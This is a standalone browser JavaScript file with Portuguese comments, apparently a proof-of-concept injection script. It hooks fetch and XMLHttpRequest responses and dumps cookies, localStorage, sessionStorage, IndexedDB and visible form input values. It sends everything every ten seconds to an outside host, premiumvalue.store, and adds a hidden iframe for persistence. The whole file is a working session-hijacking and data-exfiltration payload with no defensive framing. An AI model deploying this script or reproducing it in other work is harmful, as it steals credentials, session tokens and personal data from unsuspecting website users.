(function () {
  const endpoint = "https://premiumvalue.store/poc";
  const INTERVAL = 10000; // 10 segundos
  let lastPayload = "";

  // Hook fetch
  const originalFetch = window.fetch;
  window.fetch = async (...args) => {
    const response = await originalFetch(...args);
    try {
      const cloned = response.clone();
      const text = await cloned.text();
      report({ type: "fetch", url: args[0], body: text });
    } catch {}
    return response;
  };

  // Hook XHR
  const open = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function () {
    this.addEventListener("load", function () {
      report({ type: "xhr", url: this.responseURL, body: this.responseText });
    });
    return open.apply(this, arguments);
  };

  // IndexedDB
  async function dumpIndexedDB() {
    const databases = await indexedDB.databases();
    const result = {};
    for (const dbInfo of databases) {
      const { name, version } = dbInfo;
      try {
        const req = indexedDB.open(name, version);
        req.onsuccess = () => {
          const db = req.result;
          result[name] = {};
          const tx = db.transaction(db.objectStoreNames, "readonly");
          for (const storeName of db.objectStoreNames) {
            try {
              const store = tx.objectStore(storeName);
              const getAllReq = store.getAll();
              getAllReq.onsuccess = () => {
                result[name][storeName] = getAllReq.result;
              };
            } catch {}
          }
        };
      } catch {}
    }
    return result;
  }

  // Extração de DOM
  function extractVisibleText() {
    return Array.from(document.querySelectorAll("input, textarea, select, [contenteditable], .sensitive, .field"))
      .filter(e => e.offsetParent !== null)
      .map(e => ({
        tag: e.tagName,
        name: e.name || e.id || null,
        value: e.value || e.innerText || null
      }));
  }

  // Payload
  async function buildPayload() {
    return {
      url: location.href,
      cookies: document.cookie,
      referrer: document.referrer,
      localStorage: { ...localStorage },
      sessionStorage: { ...sessionStorage },
      inputs: extractVisibleText(),
      indexedDB: await dumpIndexedDB(),
      timestamp: Date.now()
    };
  }

  async function report(data) {
    try {
      const full = JSON.stringify(data);
      if (full !== lastPayload) {
        lastPayload = full;
        await navigator.sendBeacon(endpoint, full);
      }
    } catch {}
  }

  // Persistência leve
  if (!localStorage.hijackInjected) {
    localStorage.hijackInjected = "true";
    const iframe = document.createElement("iframe");
    iframe.style = "display:none";
    iframe.srcdoc = `<script src='${location.href}'><\/script>`;
    document.body.appendChild(iframe);
  }

  // Intervalo de coleta
  setInterval(async () => {
    const payload = await buildPayload();
    await report(payload);
  }, INTERVAL);
})();
